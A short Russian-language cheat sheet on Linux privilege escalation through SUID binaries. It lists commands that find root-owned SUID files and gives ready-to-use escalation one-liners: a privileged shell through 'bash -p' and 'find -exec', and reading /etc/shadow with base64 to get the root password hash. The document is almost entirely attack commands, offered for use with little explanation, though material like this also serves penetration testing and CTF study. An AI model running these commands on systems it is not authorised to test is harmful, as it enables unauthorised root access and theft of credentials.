# Эскалация привелегий 
### Используя уязвимости SUID 
 Бит разрешения, который позволяет пользователю запускать исполняемый файл с правами владельца этого файла

 > Необходимо найти бинарники где установлен SUID
 ```shell
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
 ```
>  Ищем совпадения на [gtfobins](https://gtfobins.github.io/)

### Повышаем права
> 1. bash
```shell
ls -la /bin/bash
bash -p
whoami
 ```
> 2. find
```shell
ls -la /usr/bin/find
find . -exec /bin/bash -p \;
whoami
 ```
 > 3. base64 - получаем хэш root пользователя
```shell
ls -la /usr/bin/base64
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
 ```


